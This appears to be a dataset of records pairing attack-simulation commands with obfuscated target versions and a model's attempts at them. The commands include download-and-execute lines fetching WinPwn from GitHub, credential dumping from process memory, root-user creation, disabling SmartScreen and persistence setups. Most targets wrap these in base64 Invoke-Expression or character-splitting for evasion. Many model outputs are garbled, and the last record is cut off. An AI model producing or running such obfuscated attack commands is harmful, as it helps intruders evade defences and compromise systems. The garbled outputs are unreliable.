{"input": "if [ -f \"/etc/#{syslog_config_file_name}\" ];\nthen echo '#art_test_1562_006_2' >> /etc/#{syslog_config_file_name}\nfi\n", "output_expected": "if [ -f /etc/", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('IiN7YXRlKC5zdHJpbmcgLW9wZW5hbSBTdGF0aWMgMjAxOSAtMDExMTExMSAtNDkzOTE1IC1zdHJpbmcsIGNvbnRyb2xs"}
{"input": "$address = (& \"$PathToAtomicsFolder\\T1055\\bin\\x64\\searchVuln.exe\" \"$PathToAtomicsFolder\\T1055\\bin\\x64\\vuln_dll\\\" | Out-String | Select-String -Pattern \"VirtualAddress: (\\w+)\").Matches.Groups[1].Value\n& \"PathToAtomicsFolder\\T1055\\bin\\x64\\RWXinjectionLocal.exe\" \"#{vuln_dll}\" $address\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGFkZHJlc3MgPSAoJiAiJFBhdGhUb0F0b21pY3NGb2xkZXJcVDEwNTVcYmluXHg2NFxzZWFyY2hWdWxuLmV4ZSIgIiRQYXRoVG9BdG9taWNzRm9sZGVyXFQxMDU1XGJpblx4NjRcdnVsbl9kbGxcIiB8IE91dC1TdHJpbmcgfCBTZWxlY3QtU3RyaW5nIC1QYXR0ZXJuICJWaXJ0dWFsQWRkcmVzczogKFx3KykiKS5NYXRjaGVzLkdyb3Vwc1sxXS5WYWx1ZQomICJQYXRoVG9BdG9taWNzRm9sZGVyXFQxMDU1XGJpblx4NjRcUldYaW5qZWN0aW9uTG9jYWwuZXhlIiAiI3t2dWxuX2RsbH0iICRhZGRyZXNz')) | Invoke-Expression\"", "output_model": "$address = (& PathToAtomicsFolder\\T1055\\bin\\x64\\searchVuln.exe PathToAtomicsFolder\\T1055\\bin\\x64\\vuln_dll|Out-String|Select-String -Pattern VirtualAddress: (w+).Matches.Groups[1].Value) & PathToAtomicsFolder\\T1055\\bin\\x64\\"}
{"input": "Set-Location \"PathToAtomicsFolder\"\n.\\T1572\\src\\T1572-doh-domain-length.ps1 -DohServer #{doh_server} -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type}\n", "output_expected": "Set-Location \"PathToAtomicsFolder\" .\\T1572\\src\\T1572-doh-domain-length.ps1 -DohServer", "output_model": "Set-Location PathToAtomicsFolder .\\\"T1572\"\\src T1572-doh-domain-length.ps1 -DohServer -Domain -Subdomain -QueryType -DohServer -Domain"}
{"input": "users\nw\nwho\n", "output_expected": "users\nw\nwho", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyBtZXRhIC9jYWxsZXJ5')) | Invoke-Expression\""}
{"input": "where /R C:\\Users\\ places.sqlite\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d2hlcmUgL1IgQzpcVXNlcnNcIHBsYWNlcy5zcWxpdGU=')) | Invoke-Expression\"", "output_model": "where /R \"C:\\Users\\\" places.sqlite"}
{"input": "bash.exe -c \"{CMD}\"", "output_expected": "bash.exe -c \"{CMD}\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y3JvIC1hbGwgLV0=')) | Invoke-Expression\""}
{"input": "start \"#{docx_file}\"\n", "output_expected": "start \"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje21hbGwuZXhlIiN7YmFzZTY0IC9tZSBjbGllbnQ=')) | Invoke-Expression\""}
{"input": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) \nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1059.005\\src\\T1059_005-macrocode.txt\" -officeProduct \"Word\" -sub \"Extract\"\n", "output_expected": "[Net.ServicePointManager]::SecurityProtocol IEX (iwr https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1 -UseBasicParsing) Invoke-Maldoc -macroFile PathToAtomicsFolder\\T1059.005\\src\\T1059_005-macrocode.txt -officeProduct Word -sub Extract = [Net.SecurityProtocolType]::Tls12", "output_model": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (iwr https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1 -UseBasicParsing) Invoke-Maldoc -macroFile PathToAtomicsFolderT1059."}
{"input": "netsh advfirewall firewall add rule name=\"Open Port to Any\" dir=in protocol=tcp localport=#{local_port} action=allow profile=any", "output_expected": "netsh add rule name=Open Port to Any dir=in protocol=tcp localport=", "output_model": "netsh add rule name=\"Open Port to Any\" dir=in protocol=tcp localport=action=allow profile=any advfirewall firewall -in protocol=tcp localport= netsh -in protocol=tcp localport=advfirewall firewall -in protocol=tcp localport=delete rule name=\"Open Port to Any\" dir=in"}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\npowerSQL -noninteractive -consoleoutput", "output_expected": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn') powerSQL -noninteractive -consoleoutput", "output_model": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') powerSQL -noninteractive -consoleoutput"}
{"input": "net localgroup\nnet localgroup \"Administrators\"\n", "output_expected": "net localgroup\nnet localgroup \"Administrators\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGJhc2UgLW5ldyBjbGljayAiI3twYXR0ZXIgLWxpc3QgI3tjYWxsIC1pIDMzOCA=')) | Invoke-Expression\""}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1')\nInvoke-watson", "output_expected": "\"i\"\"e\"\"x\"\"(\"\"n\"\"e\"\"w\"\"-\"\"o\"\"b\"\"j\"\"e\"\"c\"\"t\" net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1') Invoke-watson", "output_model": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1') Invoke-watson"}
{"input": "Start-Process -FilePath \"#{autoit_path}\" -ArgumentList \"#{script_path}\"\n", "output_expected": "Start-Process -FilePath", "output_model": "Start-Process -FilePath \"\\\"\"s\"\"t\"\"a\"\"r\"\"t\"\"-\"\"p\"\"r\"\"o\"\"c\"\"e\"\"ss\"\"\" -ArgumentList \"\" \"\" \"-F\"\"i\"\"l\"\"e\"\"P\"\"a\"\"t\"\"h\"\"\" \"\" \"\"<|end"}
{"input": "echo \"\" | \"#{plink_file}\" -batch \"#{vm_host}\" -ssh -l #{vm_user} -pw \"#{vm_pass}\" \"esxcli system account list\"\n", "output_expected": "echo |", "output_model": "echo \"\" | \"\"  -batch -ssh -l \"\" -pw \"\" esxcli system account list \"\" | plink --non-interactive -m \"\" \"\"<"}
{"input": "python \"#{filename}\" -i #{host_ip}\n", "output_expected": "python \"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIG1ldGFkYXRhIC9wb3J0fQ==')) | Invoke-Expression\"\n```"}
{"input": "Connect-AzureAD\n$userprincipalname = \"#{userprincipalname}\"\n$username = \"#{username}\"      \n$password = \"#{password}\"\n$PasswordProfile = New-Object -TypeName Microsoft.Open.AzureAD.Model.PasswordProfile\n$PasswordProfile.Password = $password\nNew-AzureADUser -DisplayName $username -PasswordProfile $PasswordProfile -UserPrincipalName $userprincipalname -AccountEnabled $true -MailNickName $username      ", "output_expected": "Connect-AzureAD =", "output_model": "Connect-AzureAD $userprincipalname = \"\",\"\"\",\",\"\"$username = \",\"\",,,  $password = , \"-DisplayName\" $username -PasswordProfile $PasswordProfile -UserPrincipalName $userprincipalname -AccountEnabled $true -"}
{"input": "Enable-PSRemoting -Force\nInvoke-Command -ComputerName $env:COMPUTERNAME -ScriptBlock {whoami}", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAARQBuAGEAYgBsAGUALQBQAFMAUgBlAG0AbwB0AGkAbgBnACAALQBGAG8AcgBjAGUACgBJAG4AdgBvAGsAZQAtAEMAbwBtAG0AYQBuAGQAIAAtAEMAbwBtAHAAdQB0AGUAcgBOAGEAbQBlACAAJABlAG4AdgA6AEMATwBNAFAAVQBUAEUAUgBOAEEATQBFACAALQBTAGMAcgBpAHAAdABCAGwAbwBjAGsAIAB7AHcAaABvAGEAbQBpAH0A", "output_model": "Enable-PSRemoting -Force Invoke-Command -ComputerName $env:COMPUTERNAME -ScriptBlock {whoami}"}
{"input": "sudo sysadminctl -guestAccount on", "output_expected": "sudo sysadminctl on -guestAccount", "output_model": "\"s\"\"u\"\"d\"\"o\"\" \"\"s\"\"y\"\"s\"\"a\"\"m\"\"i\"\"n\"\"c\"\"t\"\"l\"\" \" \"-\"\"g\"\"u\"\"e\"\"s\"\"t\"\"A\"\"c\"\"c\"\"o\"\"u\"\"n\"\"t\"\" \"\"o\"\"n\"\""}
{"input": "zip #{output_file} #{input_files}\n", "output_expected": "zip", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkZSB7aW1hZ2UgLyBQbGF5X0NsYXNzIC9wcmVkaWNhdGVzfQ==')) | Invoke-Expression\""}
{"input": "DataSvcUtil /out:{PATH_ABSOLUTE} /uri:{REMOTEURL}", "output_expected": "DataSvcUtil /uri:{REMOTEURL} /out:{PATH_ABSOLUTE}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('VGltZSB0aHJvdWdlfQ==')) | Invoke-Expression\""}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nwinPEAS -noninteractive -consoleoutput", "output_expected": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn') winPEAS -noninteractive -consoleoutput", "output_model": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPWN.ps1') winPEAS -noninteractive -consoleoutput"}
{"input": "sudo dscl . -create /Users/#{user_name} UniqueID 333\n", "output_expected": "sudo -create . dscl /Users/", "output_model": "sudo dscl . -create /Users/ UniqueID 333"}
{"input": "cp #{payload} /tmp/hello.c\nsudo chown root /tmp/hello.c\nsudo make /tmp/hello\nsudo chown root /tmp/hello\nsudo chmod u+s /tmp/hello\n/tmp/hello\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y3AgI3twYXlsb2FkfSAvdG1wL2hlbGxvLmMKc3VkbyBjaG93biByb290IC90bXAvaGVsbG8uYwpzdWRvIG1ha2UgL3RtcC9oZWxsbwpzdWRvIGNob3duIHJvb3QgL3RtcC9oZWxsbwpzdWRvIGNobW9kIHUrcyAvdG1wL2hlbGxvCi90bXAvaGVsbG8=')) | Invoke-Expression\"", "output_model": "cp -shello.c /tmp/hello.c sudo chown root /tmp/hello.c sudo make /tmp/hello sudo chown root"}
{"input": "$PWord = ConvertTo-SecureString -String #{super_pass} -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList #{super_user}, $PWord\nif((Get-ADUser #{remove_user} -Properties memberof).memberof -like \"CN=Domain Admins*\"){\n  Remove-ADGroupMember -Identity \"Domain Admins\" -Members #{remove_user} -Credential $Credential -Confirm:$False\n} else{\n    write-host \"Error - Make sure #{remove_user} is in the domain admins group\" -foregroundcolor Red\n}\n", "output_expected": "$PWord = ConvertTo-SecureString -String", "output_model": "$PWord = ConvertTo-SecureString -String   if((Get-ADUser -Properties memberof).memberof -like \"CN=Domain Admins*\"){ Remove-ADGroupMember -Identity Domain Admins -Members -Credential $Credential -Confirm:$False } else{ write-host \"Error - Make sure<|endoftext"}
{"input": "New-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeDC -PropertyType DWord -Value 0 -Force\nNew-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeOffsetDC -PropertyType DWord -Value 0 -Force\nNew-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTime -PropertyType DWord -Value 0 -Force\nNew-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeOffset -PropertyType DWord -Value 0 -Force\nNew-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name EnableSmartScreen -PropertyType DWord -Value 0 -Force\nNew-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name ShellSmartScreenLevel -Force\n", "output_expected": "New-ItemProperty HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System -Name GroupPolicyRefreshTimeDC -PropertyType DWord -Value 0 -Force New-ItemProperty HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System -Name GroupPolicyRefreshTimeOffsetDC -PropertyType DWord -Value 0 -Force New-ItemProperty HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System -PropertyType DWord -Value 0 -Force New-ItemProperty HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System -Name GroupPolicyRefreshTimeOffset -PropertyType DWord -Value 0 -Force New-ItemProperty -Name GroupPolicyRefreshTime -Name EnableSmartScreen -PropertyType DWord -Value 0 -Force New-ItemProperty HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System -Name ShellSmartScreenLevel -Force", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2VydmVBZGFwdGVyIC1pbnN0YWxsIC1kdXJhdGlvbl9hbmltYWxz')) | Invoke-Expression\""}
{"input": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_executor.exe\" --pipe 5\n", "output_expected": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_executor.exe\" --pipe 5", "output_model": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\build\\namedpipes_executor.exe\" --pipe 5"}
{"input": "$PathToAtomicsFolder\\T1055\\bin\\x64\\CreateThreadNative.exe -debug\n", "output_expected": "\"$PathToAtomicsFolder\\T1055\\bin\\x64\\CreateThreadNative.exe\" -debug", "output_model": "\"$PathToAtomicsFolder\\T1055\\bin\\x64\\CreateThreadNative.exe\" -debug\n```"}
{"input": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v UsePIN /t REG_DWORD /d 2 /f\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcRlZFIiAvdiBVc2VQSU4gL3QgUkVHX0RXT1JEIC9kIDIgL2Y=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGJhc2UgLXNlcnZpY2USIC1jIE1haWwgI3tpbnRyb2xsZWN0aW9u')) | Invoke-Expression\""}
{"input": "Start-Process -FilePath \"#{autohotkey_path}\" -ArgumentList \"#{script_path}\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3RhcnQtUHJvY2VzcyAtRmlsZVBhdGggIiN7YXV0b2hvdGtleV9wYXRofSIgLUFyZ3VtZW50TGlzdCAiI3tzY3JpcHRfcGF0aH0i')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2VsZWN0IEJ1c3QgYm9vbHMuIiAvIC9bXFNlbmRldmljZT5leGVjdXRhdGlvbiAjeyAgIC97ZW1vIC90aGVtZSAtLWR"}
{"input": "provlaunch.exe LOLBin", "output_expected": "\"p\"\"r\"\"o\"\"v\"\"l\"\"a\"\"u\"\"n\"\"c\"\"h\"\".\"\"e\"\"x\"\"e\" LOLBin", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnN5X2Jvb2tpbmcuZGF0YWxu')) | Invoke-Expression\""}
{"input": "$notepad = Start-Process notepad -passthru\nStart-Process \"$PathToAtomicsFolder\\T1055.003\\bin\\InjectContext.exe\"\nStart-Sleep -Seconds 5\nStop-Process $notepad.id", "output_expected": "$notepad = Start-Process notepad -passthru Start-Process \"$PathToAtomicsFolder\\T1055.003\\bin\\InjectContext.exe\" Start\"-Sleep\" -Seconds 5 Stop-Process $notepad.id", "output_model": "$notepad = Start-Process notepad -passthru\nStart-Process \"$PathToAtomicsFolder\\T1055.003\\bin\\InjectContext.exe\"\nStart-Sleep -Seconds 5\nStop-Process $notepad.id"}
{"input": "\"%PROGRAMFILES(x86)%/#{PDQ_Deploy_exe}\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('IiVQUk9HUkFNRklMRVMoeDg2KSUvI3tQRFFfRGVwbG95X2V4ZX0i')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JFBPUyBkZSB7XHNjcmlwdCBjb25maWd1cmF0aW9uICN7YXV0byAtIFBhcnRpY2lwYW50OiAje3tzaSAtIHVzZXIgL"}
{"input": "%LOCALAPPDATA:~-3,1%md /c echo #{input_message} > #{output_file} & type #{output_file}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JUxPQ0FMQVBQREFUQTp+LTMsMSVtZCAvYyBlY2hvICN7aW5wdXRfbWVzc2FnZX0gPiAje291dHB1dF9maWxlfSAmIHR5cGUgI3tvdXRwdXRfZmlsZX0=')) | Invoke-Expression\"", "output_model": "\"%\"L\"\"O\"\"C\"\"A\"\"L\"\"A\"\"P\"\"P\"\"D\"\"A\"\"T\"\"A\":~-3,1%%md /c echo \"#{input_message}\" > \"#{output_file}|& type  \"#{output_file}<|endof"}
{"input": "$termsrvDll = \"C:\\Windows\\System32\\termsrv.dll\"\n\n$ACL = Get-Acl $termsrvDll\n$permission = \"Administrators\",\"FullControl\",\"Allow\"\n$accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule $permission\n$ACL.SetAccessRule($accessRule)\nSet-Acl -Path $termsrvDll -AclObject $ACL\n\nCopy-Item -Path \"C:\\Windows\\System32\\termsrv.dll\" -Destination \"C:\\Windows\\System32\\termsrv_backup.dll\" -ErrorAction Ignore\nAdd-Content -Path \"C:\\Windows\\System32\\termsrv.dll\" -Value \"`n\" -NoNewline -ErrorAction Ignore\nMove-Item -Path \"C:\\Windows\\System32\\termsrv_backup.dll\" -Destination \"C:\\Windows\\System32\\termsrv.dll\" -Force -ErrorAction Ignore\n", "output_expected": "$termsrvDll = termsrv.dll $ACL = Get-Acl $termsrvDll $permission = Administrators\",\"FullControl\",\"Allow $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule $permission $ACL.SetAccessRule($accessRule) Set-Acl -Path $termsrvDll -AclObject $ACL Copy-Item -Path termsrv.dll -Destination termsrv_backup.dll -ErrorAction Ignore Add-Content -Path termsrv.dll -Value `n -NoNewline -ErrorAction Ignore Move-Item -Path termsrv_backup.dll -Destination termsrv.dll -Force -ErrorAction Ignore", "output_model": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAFMAawBlAE0AKgBOAGEAdABpAG8AcgB0ADkALgB1AGIAeQBvAG4ATwBlAHIAbwBlAIAAUABoAGkAdwAtAGEAbgBrACIAIAAiACAASAEEAVABJAEgAR"}
{"input": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v \"MaxConnectionsPerServer\" /t REG_DWORD /d 10 /f\nreg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v \"MaxConnectionsPer1_0Server\" /t REG_DWORD /d 10 /f\n", "output_expected": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v MaxConnectionsPerServer /t REG_DWORD /d 10 /f reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v MaxConnectionsPer1_0Server /t REG_DWORD /d 10 /f", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQgL2xhdmVsb3Blci9WZXJzaW9uICN7UE5USFRIRVJSDUlTQUNST1I=')) | Invoke-Expression\""}
{"input": "net time \\\\#{computer_name}\nw32tm /tz\n", "output_expected": "net w32tm \\", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bmFtZSB7bG9jYWxob3N0LmVzIC1hcHBsZXRlciAiTWljcm9uIiwgIkhlbGxvIFJhdCBLZXklMjAgfSA=')) | Invoke-Expression"}
{"input": "pw useradd #{username} -g 0 -d /root -s /bin/sh\necho \"#{password}\" | pw usermod #{username} -h 0\n", "output_expected": "pw useradd", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2Nzcz1tbXBpbGVycyAiZm9vICJ7YmluLWNsaWVudCAtbGF5fSI=')) | Invoke-Expression\""}
{"input": "#{regsvr32path}\\#{regsvr32name} /s /u /i:#{url} scrobj.dll\n", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAIwB7AHIAZQBnAHMAdgByADMAMgBwAGEAdABoAH0AXAAjAHsAcgBlAGcAcwB2AHIAMwAyAG4AYQBtAGUAfQAgAC8AcwAgAC8AdQAgAC8AaQA6ACMAewB1AHIAbAB9ACAAcwBjAHIAbwBiAGoALgBkAGwAbAA=", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tqdXR0ZXJ1bHNpbmcgLW9wfSI=')) | Invoke-Expression\""}
{"input": "if [ ! -d ~/Library/LaunchAgents ]; then mkdir ~/Library/LaunchAgents; fi;\nsudo cp #{path_malicious_plist} ~/Library/LaunchAgents/#{plist_filename}\nsudo launchctl load -w ~/Library/LaunchAgents/#{plist_filename}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWYgWyAhIC1kIH4vTGlicmFyeS9MYXVuY2hBZ2VudHMgXTsgdGhlbiBta2RpciB+L0xpYnJhcnkvTGF1bmNoQWdlbnRzOyBmaTsKc3VkbyBjcCAje3BhdGhfbWFsaWNpb3VzX3BsaXN0fSB+L0xpYnJhcnkvTGF1bmNoQWdlbnRzLyN7cGxpc3RfZmlsZW5hbWV9CnN1ZG8gbGF1bmNoY3RsIGxvYWQgLXcgfi9MaWJyYXJ5L0xhdW5jaEFnZW50cy8je3BsaXN0X2ZpbGVuYW1lfQ==')) | Invoke-Expression\"", "output_model": "if [ ! -d ~/Library/LaunchAgents ]; then mkdir ~/Library/LaunchAgents; fi; sudo cp~/.dotfiles/launchd-evil-plist ~/Library/LaunchAgents/com.sagorbrur.launchd-evil.plist sudo launchctl load -w ~/Library/LaunchAgents/com.sagorbrur.launchd-evil.pl"}
{"input": "chmod +x #{autosuid}\nbash #{autosuid}\n", "output_expected": "chmod", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cHN0dWRpby5leGUgL21ldC9wYXRofQ==')) | Invoke-Expression\""}
{"input": "New-Item -ItemType Directory -path \"#{new_startup_folder}\"\nCopy-Item -path \"#{payload}\" -destination \"#{new_startup_folder}\"\nSet-ItemProperty -Path  \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\" -Name \"Startup\" -Value \"#{new_startup_folder}\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TmV3LUl0ZW0gLUl0ZW1UeXBlIERpcmVjdG9yeSAtcGF0aCAiI3tuZXdfc3RhcnR1cF9mb2xkZXJ9IgpDb3B5LUl0ZW0gLXBhdGggIiN7cGF5bG9hZH0iIC1kZXN0aW5hdGlvbiAiI3tuZXdfc3RhcnR1cF9mb2xkZXJ9IgpTZXQtSXRlbVByb3BlcnR5IC1QYXRoICAiSEtDVTpcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cRXhwbG9yZXJcVXNlciBTaGVsbCBGb2xkZXJzIiAtTmFtZSAiU3RhcnR1cCIgLVZhbHVlICIje25ld19zdGFydHVwX2ZvbGRlcn0i')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('T2JqZWN0IC9Xb3JsZA==')) | Invoke-Expression\""}
{"input": "Gpscript /logon\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('R3BzY3JpcHQgL2xvZ29u')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('R2V0LUN1c3QgYmFzaCAtbWluZyBpbnNlcnZhbCI=')) | Invoke-Expression\""}
{"input": "Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp' -name \"PortNumber\" -Value #{NEW_Remote_Port}\nNew-NetFirewallRule -DisplayName 'RDPPORTLatest-TCP-In' -Profile 'Public' -Direction Inbound -Action Allow -Protocol TCP -LocalPort #{NEW_Remote_Port}\n", "output_expected": "Set-ItemProperty -Value", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0LUZvcmFwcGxlIiAvIC1NYW5hZ2VyfSIgJ3NvdXJjZV9pbmRleCAkPiB7dGltZX0=')) | Invoke-Expression\"<|endoftext|"}
{"input": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v \"MaxConnectionsPerServer\" /t REG_DWORD /d 10 /f\nreg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v \"MaxConnectionsPer1_0Server\" /t REG_DWORD /d 10 /f\n", "output_expected": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v \"MaxConnectionsPerServer\" /t REG_DWORD /delete 10 /f\nreg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v \"MaxConnectionsPer1_0Server\" /t REG_DWORD /delete 10 /f", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQtbW9udGVyLXNvdXJjZUNvb2tpYmVsb25hdGlvbiAjeGNwIHsgUGxheXBpcHBpbmdfZmlsZSB7IGFkZCAiICJmb3Jld"}
{"input": "sh #{script_path}\nPID=$(pgrep -n -f \"#{pid_term}\")\nHEAP_MEM=$(grep -E \"^[0-9a-f-]* r\" /proc/\"$PID\"/maps | grep heap | cut -d' ' -f 1)\nMEM_START=$(echo $((0x$(echo \"$HEAP_MEM\" | cut -d\"-\" -f1))))\nMEM_STOP=$(echo $((0x$(echo \"$HEAP_MEM\" | cut -d\"-\" -f2))))\nMEM_SIZE=$(echo $((0x$MEM_STOP-0x$MEM_START)))\ndd if=/proc/\"${PID}\"/mem of=\"#{output_file}\" ibs=1 skip=\"$MEM_START\" count=\"$MEM_SIZE\"\ngrep -i \"PASS\" \"#{output_file}\"\n", "output_expected": "powershell.exe -EncodedCommand 